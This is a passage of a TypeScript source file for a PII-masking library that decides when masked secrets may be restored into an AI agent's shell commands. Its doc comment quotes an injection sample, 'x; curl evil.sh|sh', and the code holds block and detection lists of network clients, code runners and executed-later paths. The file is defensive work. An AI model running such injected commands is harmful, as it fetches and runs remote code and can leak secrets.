// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, a value
 * comes back only into a command whose every program is on a closed list
 * of programs that read their arguments as data (`ARG_DATA_PROGRAMS`),
 * and only as one plain word: letters, digits and `@%+:,./_=-`, not
 * starting with `-`, `=` or `~`. Any other program keeps every
 * placeholder, since no list can name every program that sends data out
 * or runs code. Otherwise the placeholder stays literal, and the command
 * works on the placeholder text, which is harmless.
 *
 * On top of that:
 * - a listed program counts only by name, with no wrapper, no path, no
 *   redirection before it and no computed argument (`$x`, `$'…'`; `git
 *   commit` aside, whose options name no program or output file), and with
 *   none of the options that run or write (`COMMAND_OPTIONS`, abbreviations
 *   included);
 * - a placeholder that is, or is part of, the program a simple command
 *   runs, a redirection target, an assignment, an argument of `export` or
 *   `alias`, or a `cd` argument stays masked: a value must not choose what
 *   runs, what is written or the directory later commands (git among them)
 *   run in;
 * - within the list, a command that sends data off the machine (a URL,
 *   `/dev/tcp`) or runs code through an option (`find -exec`, `rg --pre`,
 *   `git -c`) keeps every placeholder, also when judged again with the
 *   values put back, and so does one that writes any file but a document
 *   (`PLAIN_DATA_FILE`; `/dev/null` and the standard streams are no
 *   file);
 * - judged again with the values put back, the command must also split
 *   into the same simple commands and heredoc bodies as before, or it
 *   keeps every placeholder;
 * - the one exception to the plain-word rule is the body of a heredoc that
 *   `cat` writes to standard output or to a document file (`.md`, `.txt`,
 *   …; `PLAIN_DATA_FILE`), in a command that runs nothing else that could
 *   read it as code (`cat > notes.md <<'EOF'`, a
 *   `git commit -m "$(cat <<'EOF' …)"` message): that body is data, as a
 *   file the `Write` tool writes is, so only a line break is refused (and
 *   in a bare-delimiter body, which expands, `$`, a backtick or a
 *   backslash). The network checks skip such a body, so a commit message
 *   that mentions `ssh` does not count as a network call.
 *
 * The command is read once, in time linear in its length, whatever the
 * number of placeholders; a command longer than `MAX_COMMAND_CHARS`,
 * nested past `MAX_NESTING`, with a simple command past the read window
 * (`MAX_WORD_SCAN` characters or `MAX_WORDS` words, heredoc bodies not
 * counted), with a heredoc whose closing line cannot be found, or whose
 * words would be read past the scan budget keeps every placeholder, and
 * one whose quoting or substitutions are left open loses the heredoc
 * exception. Heredoc bodies and `#`
 * comments are skipped by the quote lexer; `<<` counts only in shell code,
 * never inside quotes or as the here-string `<<<`. A `command` given as an
 * argv array (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`.
 * The Claude Code mod gets the same rules through the sidecar's `restore`
 * with `tool`.
 *
 * Best effort for what leaves the machine: no list names every network
 * client, and a value restored into a file (`Write`, `Edit`) can be sent
 * by a later command.
 */

/** Tools whose input a shell runs, as each agent names them: Claude
 * Code's `Bash`, Anthropic's bash tool (`bash`), and the `shell` tool of
 * OpenAI-style agents such as Codex. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

/** Where a placeholder stands. `heredoc` is the body of a quoted-delimiter
 * heredoc and `heredoc-expanding` that of a bare one, both only while the
 * body is data (see `DATA_PROGRAMS`); `heredoc-in-substitution` is such a
 * body inside `$(…)` or backticks; any other body is `none`. */
export type QuoteContext =
  | 'none'
  | 'single'
  | 'double'
  | 'heredoc'
  | 'heredoc-expanding'
  | 'heredoc-in-substitution';

/** The contexts of a data heredoc body. */
type DataBodyContext = 'heredoc' | 'heredoc-expanding' | 'heredoc-in-substitution';

/** Contexts that hold data a program writes out, not shell code. */
const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set<DataBodyContext>([
  'heredoc',
  'heredoc-expanding',
  'heredoc-in-substitution',
]);

/** A value that may be restored outside a data heredoc body: one plain
 * word, with no character any shell or quoting gives a meaning to, and
 * not starting with `-` (an option), `=` (zsh's `=cmd` expansion) or `~`
 * (a home directory). */
const PLAIN_WORD = /^(?![-=~])[\p{L}\p{N}@%+:,./_=-]+$/u;

/** Contexts where `$` expands. */
const EXPANDING_CONTEXTS: ReadonlySet<QuoteContext> = new Set<QuoteContext>([
  'none',
  'double',
  'heredoc-expanding',
  'heredoc-in-substitution',
]);

/** What a value may hold in a data heredoc body. */
const DATA_BODY_SAFE: Readonly<Record<DataBodyContext, RegExp>> = {
  // A quoted-delimiter body is literal: it ends only at a line that reads
  // as the delimiter. A value with no line break can still complete such a
  // line (a value `EOF` alone on its line); the second reading in
  // `restoreShellCommand` sees the body end early and keeps every value.
  heredoc: /^[^\n\u2028\u2029]*$/u,
  'heredoc-expanding': /^[^$`\\\n\u2028\u2029]*$/u,
  // Inside `$(…)` or backticks the body is not opaque to every shell: a
  // backtick ends a backtick substitution in any shell, and bash 3.2 (the
  // macOS `/bin/bash`) ends `$(…)` at a `)` in the body. So none of the
  // characters that can close or reopen the substitution or its quoting.
  'heredoc-in-substitution': /^[^$`\\()'"\n\u2028\u2029]*$/u,
};

/** Longest command read: a longer one keeps every placeholder, so the
 * work per tool call stays bounded whatever the model sends. */
export const MAX_COMMAND_CHARS = 256 * 1024;

/** The rest of one simple command, up to a bound: from an interpreter's
 * name to its code flag, past other options and their arguments. */
const SAME_COMMAND = String.raw`[^;&|\n]{0,256}?`;

/** Interpreter names, for the patterns that look inside quoted code. */
const INTERPRETER_NAMES = String.raw`(?:bash|sh|zsh|dash|ksh|fish|python[\d.]*|pypy[\d.]*|node|nodejs|bun|deno|perl|ruby|lua|php|Rscript|osascript|pwsh)`;

/** A program name standing as a whole word: not part of a path segment,
 * a file name (`sed.txt`) or a longer name (`ssh-keygen`, `~/.ssh`). */
const NAME_START = String.raw`(?<![\w.-])`;
const NAME_END = String.raw`(?![\w.-])`;

/** Code handed to an interpreter, read on the whole text so that it is
 * found where no program is read, inside an argument or a quoted string
 * (`docker run img sh -c "…"`, `find . -exec bash -c '…'`). Each code
 * flag may follow other options (`bash -o pipefail -c`); a flag cluster
 * counts when it holds the code letter (`-lc`). The program a command
 * itself runs is judged by name (`CODE_RUNNERS`). */
const NESTED_INTERPRETER = new RegExp(
  [
    String.raw`${NAME_START}(?:bash|sh|zsh|dash|ksh|fish)${NAME_END}${SAME_COMMAND}\s(?:-[A-Za-z]*c[A-Za-z]*|--command)\b`,
    String.raw`${NAME_START}(?:eval|ssh)${NAME_END}|${NAME_START}(?:su|runuser|flock|script)${NAME_END}${SAME_COMMAND}\s(?:-c|--command)\b`,
    String.raw`${NAME_START}(?:python[\d.]*|pypy[\d.]*)${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*c[A-Za-z]*\b`,
    String.raw`${NAME_START}(?:node|nodejs|bun|deno)${NAME_END}${SAME_COMMAND}\s(?:-[A-Za-z]*[ep][A-Za-z]*|--eval|--print|eval)\b`,
    String.raw`${NAME_START}(?:perl|ruby|lua|Rscript|osascript)${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*[eE][A-Za-z]*\b`,
    String.raw`${NAME_START}php${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*r[A-Za-z]*\b`,
    String.raw`\|&?\s*(?:sudo\s+)?(?:\S*/)?${INTERPRETER_NAMES}${NAME_END}`,
    String.raw`${NAME_START}${INTERPRETER_NAMES}${NAME_END}${SAME_COMMAND}(?:<<<|[<>]\()`,
    String.raw`${NAME_START}(?:awk|gawk|mawk|nawk|sed)${NAME_END}`,
  ].join('|'),
);

/** Programs that run code given to them, in their arguments, their input
 * or a file: a value anywhere in a command that runs one may be read as
 * code. Lower case, without a version suffix (`python3.12` → `python`). */
const CODE_RUNNERS: ReadonlySet<string> = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'fish',
  'csh',
  'tcsh',
  'busybox',
  'python',
  'pypy',
  'node',
  'nodejs',
  'bun',
  'deno',
  'tsx',
  'ts-node',
  'perl',
  'ruby',
  'irb',
  'lua',
  'luajit',
  'php',
  'rscript',
  'r',
  'julia',
  'osascript',
  'pwsh',
  'powershell',
  'tclsh',
  'expect',
  'awk',
  'gawk',
  'mawk',
  'nawk',
  'sed',
  'gsed',
  'eval',
  'source',
  '.',
  'xargs',
  'watch',
  'parallel',
  'flock',
  'script',
  'su',
  'runuser',
  'tmux',
  'screen',
  'at',
  'batch',
  'entr',
  'make',
  'gmake',
  'just',
  'npx',
  'pnpx',
  'bunx',
  'hyperfine',
  'gdb',
  'trap',
  'pipx',
  'emacs',
  'nix-shell',
  'crontab',
  'systemctl',
  'launchctl',
]);

/** Programs that run code through some subcommands (`uv run`, `npm exec`,
 * `docker run`); a command counts when any of its words is one. */
const CODE_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['uv', new Set(['run', 'tool'])],
  ['uvx', new Set<string>()],
  ['pnpm', new Set(['exec', 'dlx', 'run', 'test', 'start'])],
  ['yarn', new Set(['exec', 'dlx', 'run', 'test', 'start'])],
  ['bun', new Set(['run', 'x', 'test'])],
  ['poetry', new Set(['run'])],
  ['pipenv', new Set(['run'])],
  ['bundle', new Set(['exec'])],
  ['nix', new Set(['run', 'shell', 'develop'])],
  ['cargo', new Set(['run', 'test'])],
  ['go', new Set(['run', 'test', 'generate'])],
  ['docker', new Set(['run', 'exec'])],
  ['podman', new Set(['run', 'exec'])],
  [
    'git',
    new Set([
      '-c',
      '--config-env',
      'config',
      'filter-branch',
      'rebase',
      'bisect',
      'difftool',
      'mergetool',
    ]),
  ],
  ['npm', new Set(['exec', 'run', 'run-script', 'test', 'start', 'x', 'config', 'set'])],
  ['defaults', new Set(['write', 'import'])],
]);

/** A pattern for a long option and every abbreviation of it from `min`
 * characters (one by default), as getopt_long and git's parse-options accept
 * (`--out` for `--output`), with or without `=value`. */
function longOption(name: string, min = 1): string {
  const tail = name
    .slice(min)
    .split('')
    .reduceRight((rest, ch) => `(?:${escapeRe(ch)}${rest})?`, '');
  return `^--${escapeRe(name.slice(0, min))}${tail}(?:=|$)`;
}

function escapeRe(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function optionPattern(...parts: string[]): RegExp {
  return new RegExp(parts.join('|'));
}

/** Options that make an otherwise plain program run a command it is given
 * (`find -exec`, `tar -I`, `zip -TT`, `git -c core.pager=…`). */
const COMMAND_OPTIONS: ReadonlyMap<string, RegExp> = new Map([
  // `-rm` is bfs's spelling of `-delete` (Claude Code's `find` may be bfs).
  ['find', /^-(?:exec|execdir|ok|okdir|delete|rm|fprint|fprint0|fprintf|fls)$/],
  [
    'git',
    optionPattern(
      '^-[A-Za-z]*O',
      longOption('open-files-in-pager'),
      longOption('output'),
      longOption('ext-diff'),
    ),
  ],
  [
    'tar',
    /^-[A-Za-z]*I|^--(?:use-compress-program|to-command|checkpoint-action|info-script|new-volume-script)/,
  ],
  ['zip', /^-TT|^--unzip-command/],
  ['rsync', /^-[A-Za-z]*e|^--rsh/],
  ['less', /^-[A-Za-z]*\+|^\+/],
  // ripgrep takes no abbreviations; `--pre-glob` runs nothing without `--pre`.
  ['rg', /^--pre(?:=|$)|^--hostname-bin(?:=|$)/],
  ['man', /^-[A-Za-z]*P|^--pager/],
  // Writing where an option points chooses what is overwritten.
  ['sort', optionPattern('^-[A-Za-z]*o', longOption('output'), longOption('compress-program'))],
  ['base64', optionPattern('^-[A-Za-z]*o', longOption('output'))],
  // `printf -v NAME` assigns a shell variable; `file -C` writes a file.
  ['printf', /^-v/],
  ['file', optionPattern('^-[A-Za-z]*C', longOption('compile'))],
  ['fzf', /^--(?:preview|bind)/],
]);

/** Programs that run the program named after their own options, with the
 * options that take a separate argument. */
const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['sudo', new Set(['-u', '-g', '-h', '-p', '-r', '-t', '-C', '-D', '-U', '-T'])],
  ['doas', new Set(['-u', '-C'])],
  ['env', new Set(['-u', '-C', '--unset', '--chdir'])],
  ['nohup', new Set<string>()],
  ['command', new Set<string>()],
  ['builtin', new Set<string>()],
  ['exec', new Set(['-a'])],
  ['time', new Set(['-f', '-o', '--format', '--output'])],
  ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['gtimeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['ionice', new Set(['-c', '-n', '-p', '-P', '-u'])],
  ['stdbuf', new Set(['-i', '-o', '-e'])],
  ['setsid', new Set<string>()],
  ['unbuffer', new Set<string>()],
  ['caffeinate', new Set(['-t', '-w'])],
  ['chronic', new Set<string>()],
  ['xargs', new Set(['-I', '-n', '-P', '-L', '-d', '-E', '-s', '-a'])],
  ['strace', new Set(['-o', '-e', '-p', '-s', '-u'])],
  ['ltrace', new Set(['-o', '-e', '-p', '-s', '-u'])],
  ['valgrind', new Set<string>()],
  ['chroot', new Set<string>()],
  ['taskset', new Set<string>()],
  ['numactl', new Set<string>()],
  ['chrt', new Set<string>()],
  ['faketime', new Set<string>()],
  ['unshare', new Set<string>()],
  ['nsenter', new Set(['-t', '--target'])],
  ['systemd-run', new Set<string>()],
  ['pkexec', new Set(['--user'])],
  ['firejail', new Set<string>()],
  ['bwrap', new Set<string>()],
  ['proxychains', new Set(['-f'])],
  ['proxychains4', new Set(['-f'])],
  ['torsocks', new Set<string>()],
  ['flatpak-spawn', new Set<string>()],
]);

/** Wrappers that take a positional argument before the program
 * (`timeout 5 cmd`). */
const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([
  ['timeout', 1],
  ['gtimeout', 1],
  ['chroot', 1],
  ['taskset', 1],
  ['chrt', 1],
  ['faketime', 1],
]);

/** Wrapper options that make it run a shell on a string, not a program
 * (`sudo -s`, `sudo -i`, `env -S "…"`). */
const WRAPPER_SHELL_OPTION: ReadonlyMap<string, RegExp> = new Map([
  ['sudo', /^-[A-Za-z]*[is]|^--(?:shell|login)$/],
  ['env', /^-[A-Za-z]*S|^--split-string/],
]);

/** Programs that send what they are given off the machine. Lower case. */
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
  'curl',
  'curlie',
  'wget',
  'aria2c',
  'http',
  'https',
  'httpie',
  'xh',
  'nc',
  'nc.openbsd',
  'nc.traditional',
  'ncat',
  'netcat',
  'socat',
  'telnet',
  'ssh',
  'scp',
  'sftp',
  'rsync',
  'ftp',
  'lftp',
  'tftp',
  'ncftp',
  'websocat',
  'wscat',
  'grpcurl',
  'gh',
  'glab',
  'hub',
  'dig',
  'nslookup',
  'host',
  'drill',
  'kdig',
  'ping',
  'traceroute',
  'tracepath',
  'mtr',
  'whois',
  'nmap',
  'mail',
  'mailx',
  'sendmail',
  'mutt',
  'msmtp',
  'swaks',
  'aws',
  'gcloud',
  'gsutil',
  'bq',
  'az',
  'doctl',
  'oci',
  'kubectl',
  'helm',
  'oc',
  'heroku',
  'fly',
  'flyctl',
  'vercel',
  'netlify',
  'wrangler',
  'firebase',
  'supabase',
  'rclone',
  's3cmd',
  'smbclient',
  'psql',
  'mysql',
  'mariadb',
  'mongosh',
  'mongo',
  'redis-cli',
  'sqlcmd',
  'sqlplus',
  'clickhouse-client',
  'ldapsearch',
  'ldapmodify',
  'ssh-keyscan',
  'getent',
  'arp',
  'huggingface-cli',
  'hf',
  'ollama',
  'open',
  'xdg-open',
  'gio',
  'start',
  'iwr',
  'irm',
  'invoke-webrequest',
  'invoke-restmethod',
]);

/** Programs that send data out only through some of their subcommands;
 * a command counts when any of its words is one. */
const NETWORK_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  [
    'git',
    new Set([
      'push',
      'pull',
      'fetch',
      'clone',
      'ls-remote',
      'remote',
      'submodule',
      'send-email',
      'request-pull',
    ]),
  ],
  ['docker', new Set(['push', 'pull', 'login'])],
  ['podman', new Set(['push', 'pull', 'login'])],
  ['buildah', new Set(['push', 'pull', 'login'])],
  [
    'npm',
    new Set([
      'publish',
      'login',
      'adduser',
      'install',
      'i',
      'add',
      'ci',
      'update',
      'view',
      'info',
      'show',
      'search',
    ]),
  ],
  ['pnpm', new Set(['publish', 'login', 'install', 'i', 'add', 'update'])],
  ['yarn', new Set(['publish', 'login', 'npm', 'install', 'add', 'up'])],
  ['bun', new Set(['publish', 'install', 'i', 'add'])],
  ['cargo', new Set(['publish', 'login', 'install', 'add'])],
  ['gem', new Set(['push', 'signin', 'install'])],
  ['twine', new Set(['upload'])],
  ['poetry', new Set(['publish', 'add', 'install'])],
  ['uv', new Set(['publish', 'add', 'pip', 'sync'])],
  ['pip', new Set(['install', 'download'])],
  ['pip3', new Set(['install', 'download'])],
  ['go', new Set(['get', 'install'])],
  ['brew', new Set(['install', 'fetch', 'tap'])],
  ['apt', new Set(['install', 'download'])],
  ['apt-get', new Set(['install', 'download'])],
  ['openssl', new Set(['s_client', 's_server', 'ocsp'])],
]);

/** Network clients found anywhere in the text, inside quoted code too:
 * names that cannot be anything else (not after `.`, `/`… so `~/.ssh`
 * does not count), uploads by `git` and package managers, and `/dev/tcp`.
 * Best effort: no list names every way out. */
const NETWORK_CLIENT = new RegExp(
  [
    /(?<![\w.-])(?:curl|wget|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|aria2c|nslookup|traceroute|sendmail|mailx|websocat|wscat|grpcurl|gcloud|gsutil|kubectl|rclone|s3cmd|smbclient)(?![\w-])/
      .source,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod)\b/.source,
    String.raw`\bgit\b${SAME_COMMAND}\s(?:push|pull|fetch|clone|ls-remote|remote|submodule|send-email)\b`,
    String.raw`\b(?:npm|pnpm|yarn|bun|cargo)\b${SAME_COMMAND}\spublish\b`,
    /\/dev\/(?:tcp|udp)\//.source,
  ].join('|'),
  'i',
);

/** A URL: handed to a program that is not a data one, it may be opened. */
const URL_SCHEME = /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\//i;

/** In a command that runs code: a URL, a networking library, or a short
 * network client name, which that code may use. */
const NETWORK_IN_CODE =
  /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;

/** Programs whose arguments and input are data, so that a heredoc body
 * in a command that runs only these is data too. */
const DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'cat',
  'echo',
  'printf',
  'mkdir',
  'cd',
  'touch',
  'ls',
  'pwd',
  'true',
  ':',
]);

/** The programs a value may be restored into: each reads its arguments
 * as data, opens no connection and runs no code it is handed. A command
 * that runs any other program keeps every placeholder: no list can name
 * every program that sends data out or runs code, so the default is to
 * restore nothing. Programs that write where an argument says (`cp`,
 * `mv`, `rm`, `tee`, `install`) are left out, so a value cannot choose
 * what is overwritten or deleted. */
const ARG_DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'ls',
  'cat',
  'head',
  'tail',
  'wc',
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'find',
  'stat',
  'file',
  'du',
  'df',
  'diff',
  'cmp',
  'sort',
  'cut',
  'tr',
  'jq',
  'echo',
  'printf',
  'mkdir',
  'cd',
  'pwd',
  'touch',
  'basename',
  'dirname',
  'realpath',
  'readlink',
  'sha256sum',
  'sha1sum',
  'md5sum',
  'shasum',
  'base64',
  'column',
  'nl',
  'true',
  'false',
  'test',
  '[',
  ':',
]);

/** `git` subcommands a value may be restored into. */
const ARG_DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'log',
  'status',
  'diff',
  'show',
  'add',
  'commit',
  'blame',
  'grep',
  'ls-files',
  'rev-parse',
]);

/** `git` subcommands that read their arguments as data and run no code
 * on them, so a commit message heredoc in `git add … && git commit …`
 * stays data. */
const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'commit',
  'add',
  'status',
  'diff',
  'log',
  'show',
]);

/** Programs whose code can be ended by any character, letters included,
 * and that can then run a command: `sed`'s `s` takes any delimiter and an
 * `e` flag, `perl`'s `s///e` too. Not even a plain word is safe in their
 * code, so a command that runs one keeps every placeholder. */
const ANY_DELIMITER_PROGRAMS: ReadonlySet<string> = new Set(['sed', 'gsed', 'perl', 'ruby', 'irb']);
const ANY_DELIMITER_IN_TEXT = /(?<![\w.-])(?:g?sed|perl|ruby|irb)(?![\w.-])/;

/** Shell builtins whose arguments set what later commands run or see
 * (`export LD_PRELOAD=…`, `alias ll=…`): a value is never restored there. */
const ENVIRONMENT_BUILTINS: ReadonlySet<string> = new Set([
  'export',
  'declare',
  'typeset',
  'local',
  'readonly',
  'alias',
  'set',
  'unset',
  'shopt',
]);

/** Files a shell, git or a hook runner executes later: a heredoc written
 * to one is code, not data. */
const EXECUTED_LATER =
  /(?:^|[\s/'"])(?:\.git\/hooks\/|\.husky\/|\.githooks\/|\.(?:bash|zsh|ksh|mksh|tcsh|csh)rc\b|\.(?:bash_)?profile\b|\.zprofile\b|\.zshenv\b|\.zlogin\b|\.envrc\b|\.config\/fish\/|crontab\b|\/etc\/|(?:~|\$HOME)\/(?:\.local\/)?bin\/|\/usr\/(?:local\/)?bin\/|LaunchAgents\/|systemd\/)/;

/** Programs that put a file in place, whose destination may run later. */
const FILE_WRITERS: ReadonlySet<string> = new Set([
  'cp',
  'mv',
  'ln',
  'install',
  'tee',
  'dd',
  'rsync',
]);
/** A `>&` target that copies or closes a descriptor rather than naming a
 * file. */
const DESCRIPTOR_TARGET = /^(?:\d+|-)$/;
/** Redirection targets that are no file a later command could read. */
const NO_FILE_TARGETS: ReadonlySet<string> = new Set(['/dev/null', '/dev/stdout', '/dev/stderr']);
/** Characters that end a redirection target word outside quotes. */
const TARGET_ENDS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '<',
  '>',
  '(',
  ')',
]);
/** A document a data heredoc may be written to: no hidden directory or
 * file on its path (`./` and `../` aside), and a text extension. Case is
 * ignored, as on the default macOS and Windows file systems. */
const PLAIN_DATA_FILE =
  /^(?!.*(?:^|\/)\.(?!\.?\/))[\w./+-]*\.(?:md|markdown|txt|csv|tsv|log|rst)$/i;
/** `.txt` files that tools read as input: CMake's `CMakeLists.txt`, pip's
 * requirements and constraints files (`requirements/base.txt`,
 * `dev-requirements.txt`), pytest's doctest files (`test*.txt`). */
const BUILD_INPUT_TXT =
  /(?:^|\/)(?:cmakelists|test[^/]*|[^/]*(?:requirements|constraints)[^/]*)\.txt$|(?:^|\/)(?:requirements|constraints)\//i;

/** True when the redirection target `target` is a document: a file no
 * shell, build tool or test runner reads as code or configuration. */
function isDocument(target: string): boolean {
  return PLAIN_DATA_FILE.test(target) && !BUILD_INPUT_TXT.test(target);
}
/** Characters of word scanning allowed per character of command, plus a
 * base, before a command is judged too costly to read. */
const SCAN_BUDGET_PER_CHAR = 2;
const SCAN_BUDGET_BASE = 32 * 1024;
/** Characters kept of a word: enough for any name, option or assignment
 * the rules read. */
const MAX_WORD_CHARS = 256;
/** The characters a shell splits words on by default (`IFS`). */
const FIELD_SEPARATORS: ReadonlySet<string> = new Set([' ', '\t', '\n']);

/** Nesting deeper than this is not read: the command keeps every
 * placeholder. */
const MAX_NESTING = 64;

/** Programs that make a file executable, to run it. */
const RUNS_FILE_PROGRAMS: ReadonlySet<string> = new Set(['chmod']);

/** Shell words that come before the program of a simple command. */
const LEADING_KEYWORDS: ReadonlySet<string> = new Set([
  'if',
  'then',
  'else',
  'elif',
  'do',
  'while',
  'until',
  '!',
  '{',
  'coproc',
]);

/** Shell words that start a simple command with no program to run. */
const NO_PROGRAM_KEYWORDS: ReadonlySet<string> = new Set([
  'for',
  'case',
  'select',
  'function',
  'fi',
  'done',
  'esac',
  '}',
  '[[',
]);

/** How many words of a simple command are read, and how far: enough for
 * wrappers, the program and its subcommand, bounded on long input. */
const MAX_WORDS = 64;
const MAX_WORD_SCAN = 4096;

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR =
  /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))(?=[\s;&|<>()]|$)/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat']);

/** Characters after which a new simple command starts (see
 * `separatesCommands`). */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', ')', '{']);
const REDIRECTION_SIDES: ReadonlySet<string> = new Set(['<', '>']);

/** Characters after which `#` starts a comment: it must begin a word.
 * Not `$` (`$#`) or `{` (`${#x}`). A backtick counts, so a doubtful `#`
 * is read as a comment, which only makes the context after it stricter. */
const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '(',
  ')',
  '<',
  '>',
  '`',
]);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
const LEADING_TABS = /^\t+/;
/** After a heredoc delimiter: blanks, then the `)` that ends `$(…)`. */
const DELIMITER_PAREN = /^[ \t]*\)/;
const WHITESPACE = /\s/;
/** A redirection word (`>`, `2>>log`, `&>`, `<in`); group 1 is empty
 * when the operator stands alone and its target is the next word. */
const REDIRECTION = /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)(\S*)$/;
/** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;

type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'ansi' | 'double' | 'body';

/** Shell code, where quotes, substitutions and operators mean something. */
const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);

/** One level of shell nesting. `ansi` is `$'…'`, where backslash escapes
 * apply. `body` is an unquoted heredoc body: it expands `$` and backticks
 * like double quotes, but `"` is literal. In a code frame, `cmdStart` is
 * where the current simple command began, and `depth` counts the `(`
 * opened inside a `$(…)`. */
interface Frame {
  readonly kind: FrameKind;
  depth: number;
  cmdStart: number;
  /** For a `subst` frame: where its `$(` stands. */
  readonly opened?: number;
  /** For a `subst` frame: a heredoc operator was met in it. */
  heredoc?: boolean;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` and not piped on, so the body is data. */
  readonly data: boolean;
  /** Met inside `$(…)` or backticks. */
  readonly inSubstitution: boolean;
}

/** One pass over a command: the context at each target position, in
 * order, and the extent of every simple command met in shell code. */
interface Scan {
  readonly targets: readonly number[];
  readonly contexts: QuoteContext[];
  readonly commands: Array<readonly [number, number]>;
  /** The extent of every heredoc body written out as data. */
  readonly dataBodies: Array<readonly [number, number]>;
  /** The extent of every heredoc body, data or not, in the order read. */
  readonly bodies: Array<readonly [number, number]>;
  /** The extent of every heredoc body met inside `$(…)` or backticks. */
  readonly substitutionBodies: Array<readonly [number, number]>;
  /** The target of every output redirection in shell code, quotes
   * removed; empty when it expands or cannot be read whole. */
  readonly outputs: string[];
  /** The line the last `<<` was met on, and its last `|`, read once per
   * line so that many operators on one line cost linear time. */
  line: { end: number; lastPipe: number };
  /** The program word of the simple command the last `<<` was met in,
   * by the command's start, read once per command. */
  heredocCommand: { start: number; word: string };
  /** `HEREDOC_OPERATOR`, sticky, for this scan alone. */
  readonly heredocOperator: RegExp;
  /** A nested part (a heredoc body's own heredoc) could not be read, or
   * the nesting went past `MAX_NESTING`. */
  broken: boolean;
}

/** A word of a simple command, quotes and escapes removed; `computed`
 * when it holds an expansion, so its value is known only at run time. */
interface Word {
  readonly text: string;
  readonly computed: boolean;
  /** Where the word starts and ends in the text it was read from. */
  readonly start: number;
  readonly end: number;
}

/** What one simple command runs. */
interface Program {
  /** A redirection stands before the program word (`>| cat …`): shells
   * disagree on what such a prefix is, so the command is not judged as
   * the program that follows it. */
  readonly redirectedPrefix: boolean;
  /** An argument is computed (`$x`, `$'…'`): its value, an option
   * included, is known only at run time. */
  readonly computedArgs: boolean;
  /** Lower case, without directory or version suffix; `undefined` when
   * an expansion names it (`$PY`, `$(which python3)`). */
  readonly name: string | undefined;
  /** Named by a path (`./run.sh`, `/tmp/x`): it runs a file. */
  readonly byPath: boolean;
  /** The wrappers it runs behind, normalised like `name`. */
  readonly wrappers: readonly string[];
  /** A wrapper runs a shell on a string (`sudo -s`, `env -S`). */
  readonly wrapperShell: boolean;
  /** Its arguments, as far as they were read. */
  readonly args: readonly string[];
}

/** What a command does, as far as restoring into it is concerned. */
interface Verdict {
  /** It sends data off the machine, runs a program in whose code no
   * value is safe (`sed`, `perl`), or is too long to read: nothing is
   * restored. */
  readonly offMachine: boolean;
  /** The context at each placeholder position, keyed by index. */
  readonly contextAt: ReadonlyMap<number, QuoteContext>;
  /** It runs code it is handed, or could not be read whole: nothing is
   * restored, since where a value lands in that code is unknown. */
  readonly runsCode: boolean;
  /** The placeholder positions where no value is restored: the program a
   * simple command runs or part of it, an assignment, a redirection
